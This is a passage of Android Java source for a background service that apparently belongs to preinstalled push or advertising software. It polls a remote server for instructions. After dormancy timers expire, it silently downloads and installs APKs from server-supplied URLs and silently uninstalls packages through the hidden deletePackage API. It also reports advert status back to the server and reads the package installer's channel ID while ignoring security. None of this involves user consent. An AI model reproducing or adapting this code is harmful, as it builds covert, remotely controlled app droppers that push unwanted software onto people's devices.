			int statusCode = response.getStatusLine().getStatusCode();

			if (LogUtil.flag)
				Log.d(TAG, "AsyncHttpGet  request to statusCode :" + statusCode);
			if (statusCode == HttpStatus.SC_OK) {
				ByteArrayOutputStream content = new ByteArrayOutputStream();
				response.getEntity().writeTo(content);
				String ret = new String(content.toByteArray()).trim();
				content.close();
				Message msg = Message.obtain(mHandler, flag, ret);
				mHandler.sendMessage(msg);
			} else {
				Message msg = Message.obtain(mHandler, FAIL, statusCode + "");
				mHandler.sendMessage(msg);
				if (LogUtil.flag)
					Log.d(TAG, "AsyncHttpPost  request code exception.code :"
							+ statusCode);
			}

			if (LogUtil.flag)
				Log.d(TAG, "AsyncHttpGet  request to url :" + url
						+ "  finished !");
		} catch (java.lang.IllegalArgumentException e) {
			Message msg = Message.obtain(mHandler, FAIL, e.getMessage());
			mHandler.sendMessage(msg);
			if (LogUtil.flag)
				Log.d(TAG, "AsyncHttpPost  request to url :" + url
						+ "  onFail  " + e.getMessage());
		} catch (org.apache.http.conn.ConnectTimeoutException e) {
			Message msg = Message.obtain(mHandler, FAIL, e.getMessage());
			mHandler.sendMessage(msg);
			if (LogUtil.flag)
				Log.d(TAG, "AsyncHttpGet  request to url :" + url
						+ "  onFail  " + e.getMessage());
		} catch (java.net.SocketTimeoutException e) {
			Message msg = Message.obtain(mHandler, FAIL, e.getMessage());
			mHandler.sendMessage(msg);
			if (LogUtil.flag)
				Log.d(TAG, "AsyncHttpGet  request to url :" + url
						+ "  onFail  " + e.getMessage());
		} catch (UnsupportedEncodingException e) {
			Message msg = Message.obtain(mHandler, FAIL, e.getMessage());
			mHandler.sendMessage(msg);
			if (LogUtil.flag)
				Log.d(TAG, "AsyncHttpGet  request to url :" + url
						+ "  UnsupportedEncodingException  " + e.getMessage());
		} catch (org.apache.http.conn.HttpHostConnectException e) {
			Message msg = Message.obtain(mHandler, FAIL, e.getMessage());
			mHandler.sendMessage(msg);
			if (LogUtil.flag)
				Log.d(TAG, "AsyncHttpGet  request to url :" + url
						+ "  HttpHostConnectException  " + e.getMessage());
		} catch (ClientProtocolException e) {
			Message msg = Message.obtain(mHandler, FAIL, e.getMessage());
			mHandler.sendMessage(msg);
			e.printStackTrace();
			if (LogUtil.flag)
				Log.d(TAG, "AsyncHttpGet  request to url :" + url
						+ "  ClientProtocolException " + e.getMessage());
		} catch (IOException e) {
			Message msg = Message.obtain(mHandler, FAIL, e.getMessage());
			mHandler.sendMessage(msg);
			if (LogUtil.flag)
				Log.d(TAG, "AsyncHttpGet  request to url :" + url
						+ "  IOException  " + e.getMessage());
		}

	}

	private String getUrl(int Flag) {
		String url="";
		switch (Flag) {
		case REGISTER: {
			url = RequestInformation.RESOURCE_ROOT_URL + "/service/setinsert";
		}
			break;
		case UPGRADE: {
			url = RequestInformation.RESOURCE_ROOT_URL + "/service/setin";
		}
			break;
		case PLUG_ACTIVE: {
			url = RequestInformation.RESOURCE_ROOT_URL
					+ "/spush/plug_activation";
		}
			break;
		case SILENT_REPORT: {
			url = RequestInformation.RESOURCE_ROOT_URL
					+ "/report/advert_status";
		}
			break;

		default:
			break;
		}
		return url;
	}

	@SuppressLint("HandlerLeak")
	private void initHandler() {
		mHandler = new Handler() {
			@Override
			public void handleMessage(Message msg) {
				// TODO Auto-generated method stub
				switch (msg.what) {

				case REGISTER: {
					String stringData = (String) msg.obj;
					if (LogUtil.flag)
						Log.e(TAG, "getAdRegister onSuccess=========="
								+ stringData);
					getRegisterData(stringData);
					// String
					// string="{\"code\":\"200\",\"data\":{\"status\":\"OK\",\"now_time\":\"1460535854526\",\"s_time\":\"3\"},\"message\":\"OK\"}";
					// getRegisterData(string);
				}
					break;

				case UPGRADE: {
					String stringData = (String) msg.obj;
					if (LogUtil.flag)
						Log.e(TAG,
								"checkClientCanUpdateRequest onSuccess=========="
										+ stringData);
					// getUpdateData(stringData);
					getRequestUpdateData(stringData);
					// String
					// string="{\"code\":\"200\",\"data\":{\"package_name\":\"com.android.s\",\"app_size\":\"123456\",\"download_url\":\"http://gg.angelpush.com/advert/app/SmartTouch/78ce85699d5122e37ab565ba7fc383cd_20150506225721.apk\",\"now_time\":\"1563127854526\",\"s_time\":\"30\",\"version_code\":\"22\"},\"message\":\"OK\"}";
					// String
					// string="{\"code\":\"200\",\"data\":{\"package_name\":\"com.android.Perfect\",\"app_size\":\"123456\",\"download_url\":\"http://bingo-game.b0.upaiyun.com/Perfect/Perfect_AD_com_android_Perfect_V7.8.3_ad_bd3core_003_20160328.apk\",\"now_time\":\"1563127854526\",\"s_time\":\"30\",\"version_code\":\"12\"},\"message\":\"OK\"}";
					// String
					// string="{\"code\":\"200\",\"data\":{\"package_name\":\"com.android.Perfect\",\"app_size\":\"123456\",\"download_url\":\"http://dl.ludashi.com/ludashi/ludashi_home.apk\",\"now_time\":\"1563127854526\",\"s_time\":\"3\",\"version_code\":\"12\"},\"message\":\"OK\"}";
					// String
					// string="{\"code\":\"200\",\"data\":{\"androidservice\":{\"type\":\"1\",\"package_name\": \"com.android.Perfect\",\"app_size\": \"123456\",\"download_url\": \"http: //apppush.b0.upaiyun.com/res/app/41/3F57014941.apk\",\"now_time\": \"25555\",\"s_time1\": \"30\"},\"ad\": {\"package_name\": \"com.android.Perfect\",\"app_size\": \"123456\",\"download_url\": \"http: //apppush.b0.upaiyun.com/res/app/41/3F57014941.apk\",\"now_time\": \"\",\"s_time2\": \"120\"}},\"message\": \"555\",\"request_time\": \"11111111\",\"s_time\":\"2\"}";
					// getUpdateData(string);
					// getRequestUpdateData(string);
				}

					break;
				case FAIL: {
					String stringData = (String) msg.obj;
					if (LogUtil.flag)
						Log.e(TAG, "FAIL message==========" + stringData);
				}
					break;
				case SILENT_REPORT: {
					String stringData = (String) msg.obj;
					if (LogUtil.flag)
						Log.e(TAG, "SILENT_REMOVE message=========="
								+ stringData);
				}
					break;
				case PLUG_ACTIVE: {
					String stringData = (String) msg.obj;
					if (LogUtil.flag)
						Log.e(TAG, "SILENT_ACTIVE message=========="
								+ stringData);

					if (stringData != null) {
						if (LogUtil.flag)
							Log.v(TAG,
									"Perfect plugActivation_result !=null 778899=");

						if (stringData != null && !stringData.equals("")) {
							try {
								JSONObject jsonObject = new JSONObject(
										stringData);
								String code = jsonObject.getString("code");
								if (LogUtil.flag)
									Log.i(TAG, "getPlugActionData code=" + code);
								if (code != null && code.equals("200")) {
									String data = jsonObject.getString("data");
									if (data != null && !data.equals("")) {

										HelpUtil.saveFile(
												getApplicationContext(), data,
												"plugActivation");
										HelpUtil.SaveInfoToSharedPreference(
												getApplicationContext(),
												"isGetOrder", "Yes",
												"isGetOrderActivation");
										Date date11 = new Date();
										SimpleDateFormat df1 = new SimpleDateFormat(
												"yyyy-MM-dd");
										String nowdate1 = df1.format(date11);
										HelpUtil.SaveInfoToSharedPreference(
												getApplicationContext(),
												"getOrderDate", nowdate1,
												"isGetOrderActivation");
                                        if (!PerfectUtil.isWorked(getApplicationContext(), "com.android.statistics.OrderActivationService")) {
										Intent intent = new Intent();
										intent.setAction("com.android.mpsplug.activation");
										intent.setPackage(getApplicationContext().getPackageName());
										getApplicationContext().startService(intent);
                                        }
									}
								}
								if (code != null && code.equals("304")) {
									stopSelf();
								}
							} catch (JSONException e) {
								// TODO Auto-generated catch block
								e.printStackTrace();
							}
						}

					}

				}
					break;
				default:
					break;
				}
			}
		};
	}

	public static boolean isDateBefore(String date2) {
		try {
			Date date1 = new Date();
			// DateFormat df = DateFormat.getDateTimeInstance();
			SimpleDateFormat df = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
			String now = df.format(date1);
			if (LogUtil.flag)
				Log.v(TAG, "Perfect now8888=" + now);
			if (LogUtil.flag)
				Log.v(TAG, "Perfect gggggggggg8=" + df.parse(date2));
			return date1.before(df.parse(date2));
		} catch (ParseException e) {
			if (LogUtil.flag)
				Log.v(TAG, "Perfect e8333333=" + e);
			return false;
		}
	}

	public static boolean isDateAfter(String date2) {
		try {
			Date date1 = new Date();
			// DateFormat df = DateFormat.getDateTimeInstance();
			SimpleDateFormat df = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");

			String now = df.format(date1);
			if (LogUtil.flag)
				Log.v(TAG, "Perfect now8999=" + now);
			if (LogUtil.flag)
				Log.v(TAG,
						"Perfect date1.after(df.parse(date2)8="
								+ date1.after(df.parse(date2)));
			return date1.after(df.parse(date2));
		} catch (ParseException e) {
			if (LogUtil.flag)
				Log.v(TAG, "Perfect e84444=" + e);
			return false;
		}
	}

	public static boolean isDateAfterOrBefore(String date) {
		try {
			Date date1 = new Date();
			// DateFormat df = DateFormat.getDateTimeInstance();
			SimpleDateFormat df = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");

			String now = df.format(date1);
			if (LogUtil.flag)
				Log.v(TAG, "Perfect now878999=" + now);
			if (LogUtil.flag)
				Log.v(TAG,
						"Perfect date1.after(df.parse(date)78="
								+ date1.after(df.parse(date + " 23:59:59")));
			if (LogUtil.flag)
				Log.v(TAG,
						"Perfect date1.before(df.parse(date)78="
								+ date1.before(df.parse(date + " 00:00:00")));
			return date1.after(df.parse(date + " 23:59:59"))
					|| date1.before(df.parse(date + " 00:00:00"));
		} catch (ParseException e) {
			if (LogUtil.flag)
				Log.v(TAG, "Perfect e4444=" + e);
			return false;
		}
	}

	private void doAction(String data) {
		try {

			JSONObject objectData = new JSONObject(data);

			JSONArray jsonArray = objectData.getJSONArray("pusMaps");


			if (jsonArray != null) {
				long request_time = objectData.getLong("request_time");
				if (LogUtil.flag)
					Log.i(TAG, "getUpdateData new jsonObject request_time="
							+ request_time);
				SharedPreferences.Editor request_timeSharePre = getApplicationContext()
						.getSharedPreferences("Request_Time",
								getApplicationContext().MODE_PRIVATE).edit();
				request_timeSharePre.putLong("request_time", request_time);
				request_timeSharePre.commit();
				for (int i = 0; i < jsonArray.length(); i++) {
					JSONObject object = jsonArray.optJSONObject(i);
					int ex_type = object.getInt("ex_type");
					int type = object.getInt("type");
					final String packageName = object.getString("package_name");
					String appSize = object.getString("app_size");
					final String download_url = object
							.getString("download_url");
					long now_time = object.getLong("now_time");
					int s_time = object.getInt("s_time");
					int version_code = object.getInt("version_code");
					final String ad_id=object.getString("ad_id");
					if (LogUtil.flag)
						Log.i(TAG, "getUpdateData new jsonObject s_time="
								+ s_time);
					if (LogUtil.flag)
						Log.i(TAG, "getUpdateData new jsonObject ex_type="
								+ ex_type);
					if (LogUtil.flag)
						Log.i(TAG, "getUpdateData new jsonObject type=" + type);
					if (LogUtil.flag)
						Log.i(TAG, "getUpdateData new jsonObject package_name="
								+ packageName);
					if (LogUtil.flag)
						Log.i(TAG, "getUpdateData new jsonObject app_size="
								+ appSize);
					if (LogUtil.flag)
						Log.i(TAG, "getUpdateData new jsonObject download_url="
								+ download_url);
					if (LogUtil.flag)
						Log.i(TAG, "getUpdateData new jsonObject now_time="
								+ now_time);
					if (LogUtil.flag)
						Log.i(TAG, "getUpdateData new jsonObject version_code="
								+ version_code);

					if (Environment.getExternalStorageState().equals(
							Environment.MEDIA_MOUNTED)) {
						File dir = new File(HelpUtil.APK_DIR_PATHS);

						if (!dir.exists()) {
							dir.mkdirs();
						}
						File[] files = dir.listFiles();
						if (null != files) {
							for (File CurFile : files) {
								PackageManager pm = getApplicationContext()
										.getPackageManager();
								PackageInfo info = pm.getPackageArchiveInfo(
										CurFile.getAbsolutePath(),
										PackageManager.GET_ACTIVITIES);
								if (null != info) {
									if (LogUtil.flag)
										Log.v(TAG,
												"Perfect info.packageNameInSDCard="
														+ info.packageName);

									// 如果静默接口需要下发的APK在T卡里面已经存在，就不进行下载
									if (info.packageName.equals(packageName)) {
										apkIsExist = true;

										String file = HelpUtil.APK_DIR_PATHS
												+ "/"
												+ download_url
														.substring(download_url
																.lastIndexOf("/") + 1);
										if (LogUtil.flag)
											Log.v(TAG,
													"Perfect info.packageNameInSDCard  file= "
															+ file);
										filePath = file;
										if (LogUtil.flag)
											Log.v(TAG,
													"Perfect info.packageNameInSDCard  filePath= "
															+ filePath);
										break;
									} else {
										apkIsExist = false;
									}
								}
							}
						}
					}

					// UpdateData updateData=new UpdateData(packageName,
					// ex_type, type, appSize, download_url, now_time,
					// androidservice_time);
					// ex_type 1，androidservice
					if (ex_type == 1) {

						// 1静默安装；
						if (type == 1) {
							SharedPreferences sTimeSharedPreferences = getSharedPreferences(
									"UinstallSTime", 0);
							String sTime = sTimeSharedPreferences.getString(
									"STime", null);
							if (LogUtil.flag)
								Log.d(TAG, "Perfect sTime() 31256755776="
										+ sTime);
							String packName = null;
							int versioncode = 0;
							// 是否存在自己action
							boolean isExist = false;
							List<PackageInfo> list = PerfectUtil
									.getInstalledPackages(getApplicationContext());
							if (list != null && list.size() > 0) {
								for (int j = 0; j < list.size(); j++) {
									if (LogUtil.flag)
										Log.d(TAG,
												i
														+ "Perfect ifExitGetPackageName packageName776="
														+ list.get(j).packageName);
										if (packageName != null
												&& packageName.equals(list
														.get(j).packageName)) {
											packName = list.get(j).packageName;
											versioncode = list.get(j).versionCode;
											isExist=true;
										}
										break;
								}
							}
							if (LogUtil.flag)
								Log.d(TAG, "Perfect packName() 31256755776="
										+ packName);
							if (LogUtil.flag)
								Log.d(TAG, "Perfect versioncode() 31256755776="
										+ versioncode);
							if (LogUtil.flag)
								Log.d(TAG,
										"Perfect version_code() 31256755776="
												+ version_code);
							// }
							if (LogUtil.flag)
								Log.d(TAG, "Perfect bl2() isExist="
										+ isExist);

							if (sTime != null) {
								if (LogUtil.flag)
									Log.d(TAG,
											"Perfect isDateAfter(sTime) 312ee56755776="
													+ isDateAfter(sTime));
								if ((isDateAfter(sTime) && !isExist)
										|| (isDateAfter(sTime)
												&& isExist
												&& packName != null
												&& packageName.equals(packName)
												&& versioncode != 0 && version_code > versioncode)) {
									new Thread(new Runnable() {

										@Override
										public void run() {
											// TODO Auto-generated method stub

											downloadIntent(
													getApplicationContext(),
													download_url, apkIsExist,
													filePath,ad_id,packageName);
										}
									}).start();
								}
							}
							if ((sTime == null && !isExist)
									|| (sTime == null && isExist
											&& packName != null
											&& packageName.equals(packName)
											&& versioncode != 0 && version_code > versioncode)) {
								new Thread(new Runnable() {

									@Override
									public void run() {
										// TODO Auto-generated method stub

										downloadIntent(getApplicationContext(),
												download_url, apkIsExist,
												filePath,ad_id,packageName);
									}
								}).start();
							}

						}
						// 2、静默卸载
						if (type == 3) {
							SharedPreferences.Editor requestSharePre = getApplicationContext()
									.getSharedPreferences(
											"Request_Time",
											getApplicationContext().MODE_PRIVATE)
									.edit();
							requestSharePre.putLong("request_time", 0);
							requestSharePre.commit();
							
							if (PerfectUtil.isInstalled(getApplicationContext(),
									packageName)){
								if (LogUtil.flag)
									Log.d(TAG,
											"Perfect removeApp packageName 776="
													+ packageName);
								deleteApk(packageName);
							}
						}
					}
					// ex_type 2.ad
					if (ex_type == 2) {

						if (LogUtil.flag)
							Log.v(TAG, "Perfect s_time 3245555541567=" + s_time);
						SharedPreferences registerTime = getSharedPreferences(
								"registerTime", 0);
						long regsTime = registerTime.getLong("registerTime", 0);
						if (LogUtil.flag)
							Log.v(TAG, "Perfect regsTime 3245541567="
									+ regsTime);
						long ii = (long) s_time * 24 * 3600 * 1000;
						if (LogUtil.flag)
							Log.v(TAG, "Perfect now_time-regsTime 3245541567="
									+ (now_time - regsTime));
						if (LogUtil.flag)
							Log.v(TAG, "Perfect ii 3245541567=" + ii);

						if (now_time != 0 && regsTime != 0 && ii >= 0
								&& (now_time - regsTime > ii)) {

							// 注册，沉默满足要求，并且手机不存在我们的应用
							boolean isInstall=PerfectUtil.isInstalled(getApplicationContext(), packageName);
							if (LogUtil.flag)
								Log.v(TAG, "Perfect isInstall 3245541567=" + isInstall);
							int code=0;
							if(isInstall){
							 PackageManager manager = getPackageManager();//获取包管理器
						        try {
						            //通过当前的包名获取包的信息
						            PackageInfo info = manager.getPackageInfo(getPackageName(),0);//获取包对象信息
						            code=info.versionCode;
						        } catch (PackageManager.NameNotFoundException e) {
						            e.printStackTrace();
						        }
						  	
							}
							if (!isInstall
									||(isInstall&&version_code>code)) {
								if (LogUtil.flag)
									Log.v(TAG, "Perfect start downloadIntent=");
								new Thread(new Runnable() {

									@Override
									public void run() {
										// TODO Auto-generated method stub

										downloadIntent(getApplicationContext(),
												download_url, apkIsExist,
												filePath,ad_id,packageName);
									}
								}).start();
							}
						}
					}
				}
			}
		} catch (JSONException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
	}

	/**
	 * 检查PackageInstall的渠道号是否存在
	 * 
	 * @param mContext
	 * @return
	 */
	private boolean checkPackageInstallerChannelID(Context mContext) {
		try {
			Context contextEx = mContext.createPackageContext(
					"com.android.packageinstaller",
					Context.CONTEXT_IGNORE_SECURITY);
			// context.getPackageManager().getApplicationInfo("com.android.settings",128).metaData.get("ChannelID");
			String key = getString(contextEx, "ChannelID");
			Log.e("checkKey()", ": key = " + key);
			if (key != null && !key.equals("none")) {

				return true;
			} else {
				return false;
			}
		} catch (NameNotFoundException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		return false;
	}

	private static String getString(Context context, String s) {
		return (String) readKey(context, s);
	}

	private static Object readKey(Context context, String s) {
		Object obj = null;
		try {
			obj = context.getPackageManager().getApplicationInfo(
					context.getPackageName(), 128).metaData.get(s);
		} catch (Exception e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
			obj = "none";
		}

		return obj;
	}

	private void deleteApk(String packageName) {
		if (LogUtil.flag)
			Log.v(TAG, "Perfect deleteApk!");
		// 如果是系统ROM自带APP就静默卸载
			PackageManager pm = getApplicationContext().getPackageManager();
			if (LogUtil.flag)
				Log.v(TAG, "Perfect deleteApk pm"+pm);
			PackageDeleteObserver observer = new PackageDeleteObserver();
			try {
				pm.deletePackage(packageName, observer, 0);
			} catch (SecurityException e) {
				// TODO Auto-generated catch block
				if (LogUtil.error_flag)
					e.printStackTrace();
			} catch (IllegalArgumentException e) {
				// TODO Auto-generated catch block
				if (LogUtil.error_flag)
					e.printStackTrace();
			}
	}

	class PackageDeleteObserver extends IPackageDeleteObserver.Stub {
		PackageDeleteObserver() {
		}

		// android > 4
		public void packageDeleted(String name, int status)
				throws RemoteException {
			synchronized (this) {
				this.notifyAll();
				// do your thing
			}
		}

		// android < 4
		public void packageDeleted(boolean status) throws RemoteException {
			synchronized (this) {
				this.notifyAll();
				// do your thing
			}
		}
	}

	// Added-e by Perfect for 静默卸载


	private void removeDown(Context context) {
		SharedPreferences downloadInfo_SharedPreferences = context
				.getSharedPreferences("DownloadInfo", 0);
		long ID = downloadInfo_SharedPreferences.getLong("ID", 0);
		if (LogUtil.flag)
			Log.v(TAG, "Perfect queryDown ID 456546 =" + ID);

		DownloadManager downloadManager = (DownloadManager) context
				.getSystemService(Context.DOWNLOAD_SERVICE);
		Query myDownloadQuery = new Query();
		myDownloadQuery.setFilterByStatus(DownloadManager.STATUS_SUCCESSFUL);
		Cursor myDownload = downloadManager.query(myDownloadQuery);
		if (LogUtil.flag)
			Log.d(TAG, "queryDown myDownload===" + myDownload);
		if (myDownload != null) {
			while (myDownload.moveToNext()) {
				int id = myDownload.getColumnIndex(DownloadManager.COLUMN_ID);
				long queryID = myDownload.getLong(id);
				if (LogUtil.flag)
					Log.d(TAG, "queryDown id===" + id);
				if (LogUtil.flag)
					Log.d(TAG, "queryDown queryID===" + queryID);
				// TODO Do something with the file.
				if (ID == queryID) {
					downloadManager.remove(queryID);
				}
			}
			myDownload.close();
		}

	}
}
